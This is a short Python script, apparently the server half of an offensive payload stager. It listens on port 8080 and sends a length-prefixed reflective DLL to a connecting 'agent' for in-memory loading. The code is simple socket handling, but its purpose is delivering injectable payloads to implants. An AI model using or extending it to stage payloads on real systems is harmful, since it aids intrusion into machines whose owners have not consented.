import argparse
import socket
import struct

# Bind to all available
host = "0.0.0.0"
port = 8080


def main(dllpath):
    try:
        with open(dllpath, "rb") as file:
            binary_data = file.read()
            binary_data_size = len(binary_data)

            print(f"Reflective dll read successfully, size: {binary_data_size} bytes")
    except FileNotFoundError:
        print(f"File '{dllpath}' not found.")
        return
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))

    # Listen for incoming connections
    # Max 1 connection
    server_socket.listen(1)

    print(f"Server is listening on {host}:{port}")

    client_socket, client_address = server_socket.accept()

    print(f"Accepted connection from {client_address}")

    try:
        # Pack the size into a 4 byte unsigned int
        # Use little endian byte order
        size_message = struct.pack("<I", binary_data_size)

        print(f"Sending the size: {binary_data_size} to agent")

        # Send the size message
        client_socket.send(size_message)

        print("Sending the reflective DLL to agent")

        # Send the buffer message
        client_socket.send(binary_data)

        print("Done")

        #     # If data is received, decode and print it
        #     print(f"Received data: {data.decode('utf-8')}")
        #     print(f"Received data size: {len(data)}")

    except Exception as e:
        print(f"Something went wrong: {e}")

    finally:
        client_socket.close()

    server_socket.close()

    print("Finished")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Launches the server that serves the concatenated reflective dll"
    )
    parser.add_argument("dllpath", help="Path to the reflective dll to be served")

    args = parser.parse_args()

    main(args.dllpath)
